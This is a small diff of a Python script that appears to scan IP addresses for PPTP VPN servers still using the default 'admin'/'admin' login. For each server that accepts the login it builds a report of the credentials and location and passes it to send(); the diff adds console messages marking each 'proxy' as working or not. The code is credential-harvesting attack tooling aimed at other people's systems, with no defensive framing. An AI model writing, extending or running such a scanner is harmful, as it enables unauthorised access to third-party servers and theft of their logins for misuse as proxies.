@@ -63,10 +63,12 @@ def process_pptp_file(filename):
             iss = pptp(ips, "admin", "admin")
             text = f"{iss[0]} - pptp\nLogPass={iss[1]}:{iss[2]}\nState:{ipif(iss[0])[0]}/{ipif(iss[0])[2]}"
             send(text)
+            print(f"proxy: {ips} - is work")
             pskl()
         except:
             add_checked(ips)
             pskl()
+            print(f"proxy: {ips} - isn't work")
             continue
 
 
